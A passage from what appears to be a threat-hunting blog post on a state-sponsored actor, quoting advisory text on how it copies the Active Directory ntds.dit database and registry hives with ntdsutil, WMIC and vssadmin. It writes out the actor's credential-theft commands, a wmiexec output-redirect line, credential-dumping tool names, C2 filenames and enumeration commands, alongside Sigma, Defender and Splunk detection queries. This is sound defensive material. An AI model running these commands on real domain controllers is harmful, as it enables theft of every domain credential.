@’\powershell.exe’ or FolderPath endswith @’\pwsh.exe’ or FolderPath endswith @’\wmic.exe’ or FolderPath endswith @’\vssadmin.exe’) or InitiatingProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’) or ProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’)) and (ProcessCommandLine contains @’shadow’ and ProcessCommandLine contains @’create’))</span></pre><blockquote class="ow ox oy"><p id="36ba" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an <strong class="of gw">elevated command prompt</strong> (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command activate instance <strong class="of gw">ntds ifm</strong> can also be executed using the short notation <strong class="of gw">ac i ntds i.</strong> Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.</p></blockquote><h2 id="aba2" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">ntdsutil and wmic</h2><blockquote class="ow ox oy"><p id="b287" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="d81c" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\pro</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="cfab" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “cmd.exe /c ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\Pro”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="5f87" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6b3c" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe” /c wmic process call create “cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\McAfee_Logs\”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b384" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\” 1&gt; \\127.0.0.1\ADMIN$\ 2&gt;&amp;1</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntds.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_susp_ntds.yml at master · SigmaHQ/sigma</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qx l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="0d59" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="6f8b" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((((FolderPath endswith @’\NTDSDump.exe’ or FolderPath endswith @’\NTDSDumpEx.exe’) or (ProcessCommandLine contains @’ntds.dit’ and ProcessCommandLine contains @’system.hiv’) or ProcessCommandLine contains @’NTDSgrab.ps1&#x27;) or (ProcessCommandLine contains @’ac i ntds’ and ProcessCommandLine contains @’create full’) or (ProcessCommandLine contains @’/c copy ‘ and ProcessCommandLine contains @’\windows\ntds\ntds.dit’) or (ProcessCommandLine contains @’activate instance ntds’ and ProcessCommandLine contains @’create full’) or (ProcessCommandLine contains @’powershell’ and ProcessCommandLine contains @’ntds.dit’)) or (ProcessCommandLine contains @’ntds.dit’ and ((InitiatingProcessFolderPath contains @’\apache’ or InitiatingProcessFolderPath contains @’\tomcat’ or InitiatingProcessFolderPath contains @’\AppData\’ or InitiatingProcessFolderPath contains @’\Temp\’ or InitiatingProcessFolderPath contains @’\Public\’ or InitiatingProcessFolderPath contains @’\PerfLogs\’) or (FolderPath contains @’\apache’ or FolderPath contains @’\tomcat’ or FolderPath contains @’\AppData\’ or FolderPath contains @’\Temp\’ or FolderPath contains @’\Public\’ or FolderPath contains @’\PerfLogs\’))))</span></pre><p id="6cc3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="9205" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((((Image=”*\\NTDSDump.exe” OR Image=”*\\NTDSDumpEx.exe”) OR ((CommandLine=”*ntds.dit*”) AND (CommandLine=”*system.hiv*”)) OR CommandLine=”*NTDSgrab.ps1*”) OR ((CommandLine=”*ac i ntds*”) AND (CommandLine=”*create full*”)) OR ((CommandLine=”*/c copy *”) AND (CommandLine=”*\\windows\\ntds\\ntds.dit*”)) OR ((CommandLine=”*activate instance ntds*”) AND (CommandLine=”*create full*”)) OR ((CommandLine=”*powershell*”) AND (CommandLine=”*ntds.dit*”))) OR (CommandLine=”*ntds.dit*” AND ((ParentImage=”*\\apache*” OR ParentImage=”*\\tomcat*” OR ParentImage=”*\\AppData\\*” OR ParentImage=”*\\Temp\\*” OR ParentImage=”*\\Public\\*” OR ParentImage=”*\\PerfLogs\\*”) OR (Image=”*\\apache*” OR Image=”*\\tomcat*” OR Image=”*\\AppData\\*” OR Image=”*\\Temp\\*” OR Image=”*\\Public\\*” OR Image=”*\\PerfLogs\\*”))))</span></pre><p id="1dd9" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: The would be an epoch timestamp following the format like <strong class="of gw">“__1684956600.123456”.</strong> Each actor command above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the <strong class="of gw">C:\Windows\Temp\ </strong>directory, where is replaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By default, the hidden ADMIN$ share is mapped to <strong class="of gw">C:\Windows\,</strong> so the last command will direct standard output and error messages from the command to a file within the folder specified. The actor has also saved the files directly to the <strong class="of gw">C:\Windows\Temp</strong> and <strong class="of gw">C:\Users\Public</strong> directories, so the entirety of those directory structures should be analyzed.</p><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_parent_process.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_parent_process.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qy l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="2347" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5d70" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (TargetFilename=”*\\ntds.dit” AND ((ParentImage=”*\\cscript.exe” OR ParentImage=”*\\httpd.exe” OR ParentImage=”*\\nginx.exe” OR ParentImage=”*\\php-cgi.exe” OR ParentImage=”*\\powershell.exe” OR ParentImage=”*\\pwsh.exe” OR ParentImage=”*\\w3wp.exe” OR ParentImage=”*\\wscript.exe”) OR (ParentImage=”*\\apache*” OR ParentImage=”*\\tomcat*” OR ParentImage=”*\\AppData\\*” OR ParentImage=”*\\Temp\\*” OR ParentImage=”*\\Public\\*” OR ParentImage=”*\\PerfLogs\\*”)))</span></pre><p id="0e41" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="6be4" class="pp ni gv pm b bg pq pr l ps pt">DeviceFileEvents | where (FolderPath endswith @’\ntds.dit’ and ((InitiatingProcessFolderPath endswith @’\cscript.exe’ or InitiatingProcessFolderPath endswith @’\httpd.exe’ or InitiatingProcessFolderPath endswith @’\nginx.exe’ or InitiatingProcessFolderPath endswith @’\php-cgi.exe’ or InitiatingProcessFolderPath endswith @’\powershell.exe’ or InitiatingProcessFolderPath endswith @’\pwsh.exe’ or InitiatingProcessFolderPath endswith @’\w3wp.exe’ or InitiatingProcessFolderPath endswith @’\wscript.exe’) or (InitiatingProcessFolderPath contains @’\apache’ or InitiatingProcessFolderPath contains @’\tomcat’ or InitiatingProcessFolderPath contains @’\AppData\’ or InitiatingProcessFolderPath contains @’\Temp\’ or InitiatingProcessFolderPath contains @’\Public\’ or InitiatingProcessFolderPath contains @’\PerfLogs\’)))</span></pre><p id="6769" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE 2:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="962c" class="pp ni gv pm b bg pq pr l ps pt">DeviceFileEvents | where (FolderPath endswith @’\ntds.dit’ and ((InitiatingProcessFolderPath endswith @’\cmd.exe’ or InitiatingProcessFolderPath endswith @’\cscript.exe’ or InitiatingProcessFolderPath endswith @’\mshta.exe’ or InitiatingProcessFolderPath endswith @’\powershell.exe’ or InitiatingProcessFolderPath endswith @’\pwsh.exe’ or InitiatingProcessFolderPath endswith @’\regsvr32.exe’ or InitiatingProcessFolderPath endswith @’\rundll32.exe’ or InitiatingProcessFolderPath endswith @’\wscript.exe’ or InitiatingProcessFolderPath endswith @’\wsl.exe’ or InitiatingProcessFolderPath endswith @’\wt.exe’) or (InitiatingProcessFolderPath contains @’\AppData\’ or InitiatingProcessFolderPath contains @’\Temp\’ or InitiatingProcessFolderPath contains @’\Public\’ or InitiatingProcessFolderPath contains @’\PerfLogs\’)))</span></pre><p id="34ad" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk 2:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b2f7" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (TargetFilename=”*\\ntds.dit” AND ((Image=”*\\cmd.exe” OR Image=”*\\cscript.exe” OR Image=”*\\mshta.exe” OR Image=”*\\powershell.exe” OR Image=”*\\pwsh.exe” OR Image=”*\\regsvr32.exe” OR Image=”*\\rundll32.exe” OR Image=”*\\wscript.exe” OR Image=”*\\wsl.exe” OR Image=”*\\wt.exe”) OR (Image=”*\\AppData\\*” OR Image=”*\\Temp\\*” OR Image=”*\\Public\\*” OR Image=”*\\PerfLogs\\*”)))</span></pre><p id="d40d" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network. Please read also my article <a class="af pf" href="https://medium.com/detect-fyi/sensor-mappings-to-att-ck-smap-a-concrete-example-of-how-to-use-the-smap-for-a-real-world-700e53ed1c48" rel="noopener">Sensor Mappings to ATT&amp;CK (SMAP) — a concrete example of how to use the SMAP for a real world adversary behavior</a> to get a deep technical understanding about it how threat actor abuse ntds.dit and ntdsutil and how you can prevent and detect it.</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1c6c" class="pp ni gv pm b bg pq pr l ps pt">\Active Directory\ntds.dit \</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7c82" class="pp ni gv pm b bg pq pr l ps pt">Active Directory\ntds.jfm</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="e209" class="pp ni gv pm b bg pq pr l ps pt">\registry\SECURITY</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="c34b" class="pp ni gv pm b bg pq pr l ps pt">\registry\SYSTEM</span></pre><blockquote class="ow ox oy"><p id="8343" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to: <strong class="of gw">Windows Logs | Application</strong>. To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to <strong class="of gw">ID numbers 216, 325, 326, and 327</strong>. Clicking the OK box will apply the filters to the results. Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference ntds.dit. If such events are present, the events’ details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised — or actor-created — user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor’s actions.</p><p id="4b01" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and/or join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA’s Eviction Guidance for Network Affected by the SolarWinds and Active Directory/M365 Compromise. In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1d66" class="pp ni gv pm b bg pq pr l ps pt">Secretsdump.py</span></pre><p id="d9fd" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">This script is a component of Impacket, which the actor has been known to use</p><p id="02e0" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">· Invoke-NinjaCopy (PowerShell)</p><p id="9283" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">· DSInternals (PowerShell)</p><p id="68e3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">· FgDump</p><p id="35a6" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">· Metasploit</p><p id="f146" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">If you don’t use such tools, the recommendation would be to block them as a great opportunity to set choke points.</p><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_impacket_secretdump.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/builtin/security/win_security_impacket_secretdump.yml at master · SigmaHQ/sigma</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qz l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="667d" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="3e24" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:Security” AND (EventCode=”5145&quot; AND ShareName=”\\\\\*\\ADMIN$” AND (RelativeTargetName=”*SYSTEM32\\*”) AND (RelativeTargetName=”*.tmp*”))</span></pre><p id="d8ca" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.</p><h2 id="0154" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Data Sources for NTDS.dit</h2><p id="d4ab" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Command Execution</p><blockquote class="ow ox oy"><p id="b50f" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Monitor executed commands and arguments that may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. Look for command-lines that invoke attempts to access or copy the NTDS.dit.</p><p id="2e36" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: Events 4688 (Microsoft Windows Security Auditing) and 1 (Microsoft Windows Sysmon) provide context of commands and parameters being executed via creation of a new process. Event 800 (PowerShell) provides context of commands and parameters being executed via PowerShell. This detection is based on known Windows utilities commands and parameters that can be used to copy the ntds.dit file. It is recommended to keep the list of commands and parameters up to date.</p></blockquote><p id="df0d" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Analytic 1 — Command line attempt to access or create a copy of ntds.dit file</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b705" class="pp ni gv pm b bg pq pr l ps pt">`suspicious_command = filter command_execution where ( (event_id = “4688” OR event_id = “1” OR event_id = “800”) AND ((command_line = “*ntds*” AND command_line = “*ntdsutil*” AND command_line = “*create*”) OR (command_line = “**vssadmin” AND command_line = “*create*” AMD command_line = “*shadow*”) OR (command_line = “*copy*” AND command_line = “*ntds.dit*”)) `</span></pre><h2 id="b827" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">File Access</h2><p id="1268" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Monitor for access or copy of the NTDS.dit.</p><blockquote class="ow ox oy"><p id="cd29" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users requesting access or accessing file objects (ObjectType = File) such as C:\Windows\NTDS\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. Access rights that allow read operations on file objects and its attributes are %%4416 Read file data, %%4419 Read extended file attributes, %%4423 Read file attributes. If you search for just the name of the file and not the entire directory, you may get access events related to the ntds.dit file within a snapshot or volume shadow copy.</p><p id="f3f8" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users creating or copying file objects (ObjectType = File) such as C:\Windows\NTDS\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. In order to filter file creation events, filter access rigths %%4417 Write data to the file and %%4424 Write file attributes.</p><p id="2485" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Event 11 (Microsoft Windows Sysmon) provide context of processes and users creating or copying files. Unfortunately, this event provides context of the file being created or copied, but not the file being copied. A good starting point would be to look for new files created or copied with extension .dit.</p></blockquote><p id="fccb" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Analytic 1</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="f70b" class="pp ni gv pm b bg pq pr l ps pt">`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4416*” OR access_list = “*%%4419*” OR access_list = “*%%4416*”)`</span></pre><p id="ac8c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Analytic 2</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="fdcf" class="pp ni gv pm b bg pq pr l ps pt">`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4417*” OR access_list = “*%%4424*”)`</span></pre><p id="9b45" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Analytic 3</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="851e" class="pp ni gv pm b bg pq pr l ps pt">`suspicious_file = filter file_access where ((event_id = “11”) AND (file_name = “*.dit”) `</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_ntds_dit_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/file/file_event/file_event_win_ntds_dit_creation.yml at master · SigmaHQ/sigma</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="ra l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="9716" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Hunting Translation Microsoft Defender — Keep it simple</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="2426" class="pp ni gv pm b bg pq pr l ps pt">DeviceFileEvents | where FolderPath endswith @’ntds.dit’</span></pre><p id="5e0d" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Hunting Translation Splunk — Keep it simple</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b869" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND TargetFilename=”*ntds.dit”</span></pre><h2 id="784a" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Impacket</h2><p id="a78f" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (<strong class="of gw">C:\Windows\</strong>) containing an epoch timestamp in its name. The following is an example of the “<strong class="of gw">dir</strong>” command being executed by <strong class="of gw">wmiexec.py</strong></p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="0723" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\__1684956600.123456 2&gt;&amp;1</span></pre><p id="35f9" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: Discovery of an entry similar to the example above in the Windows Event Log and/or a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.</p><h1 id="964c" class="rb ni gv bf nj rc rd hv nm re rf hy np rg rh ri rj rk rl rm rn ro rp rq rr rs bk">Additional IOC PRC</h1><p id="5bb7" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Hardcoded C2 Callbacks with port 80880,8443,8043,800,10443, with various filenames</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="9213" class="pp ni gv pm b bg pq pr l ps pt">cisco_up.exe,</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="efeb" class="pp ni gv pm b bg pq pr l ps pt">cl64.exe,</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="97a8" class="pp ni gv pm b bg pq pr l ps pt">vm3dservice.exe,</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="5073" class="pp ni gv pm b bg pq pr l ps pt">watchdogd.exe,</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="105c" class="pp ni gv pm b bg pq pr l ps pt">Win.exe,</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="0219" class="pp ni gv pm b bg pq pr l ps pt">WmiPreSV.exe, and</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="0c91" class="pp ni gv pm b bg pq pr l ps pt">WmiPrvSE.exe</span></pre><h2 id="e91e" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Enumeration all</h2><p id="a325" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="71e7" class="pp ni gv pm b bg pq pr l ps pt">arp -a</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="3991" class="pp ni gv pm b bg pq pr l ps pt">curl www.ip-api.com</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="3ec9" class="pp ni gv pm b bg pq pr l ps pt">dnscmd . /enumrecords /zone {REDACTED}</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="8ac0" class="pp ni gv pm b bg pq pr l ps pt">dnscmd . /enumzones</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b083" class="pp ni gv pm b bg pq pr l ps pt">dnscmd /enumrecords {REDACTED} . /additional</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a2d0" class="pp ni gv pm b bg pq pr l ps pt">ipconfig /all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4721" class="pp ni gv pm b bg pq pr l ps pt">ldifde.exe -f c:\windows\temp\.txt -p subtree</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="bcbf" class="pp ni gv pm b bg pq pr l ps pt">net localgroup administrators</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4ad8" class="pp ni gv pm b bg pq pr l ps pt">net group /dom</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7b4a" class="pp ni gv pm b bg pq pr l ps pt">net group “Domain Admins” /dom</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="2d1a" class="pp ni gv pm b bg pq pr l ps pt">netsh interface firewall show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="ac0b" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b623" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy show v4tov4</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="c4b1" class="pp ni gv pm b bg pq pr l ps pt">netsh firewall show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6383" class="pp ni gv pm b bg pq pr l ps pt">netsh portproxy show v4tov4</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="381c" class="pp ni gv pm b bg pq pr l ps pt">netstat -ano</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6a3e" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\ systeminfo tasklist /v</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="258c" class="pp ni gv pm b bg pq pr l ps pt">whoami</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d3a1" class="pp ni gv pm b bg pq pr l ps pt">wmic volume list brief</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6692" class="pp ni gv pm b bg pq pr l ps pt">wmic service brief</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="fd0c" class="pp ni gv pm b bg pq pr l ps pt">wmic product list brief</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6bd0" class="pp ni gv pm b bg pq pr l ps pt">wmic baseboard list full</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4c46" class="pp ni gv pm b bg pq pr l ps pt">wevtutil qe security /rd:true /f:text 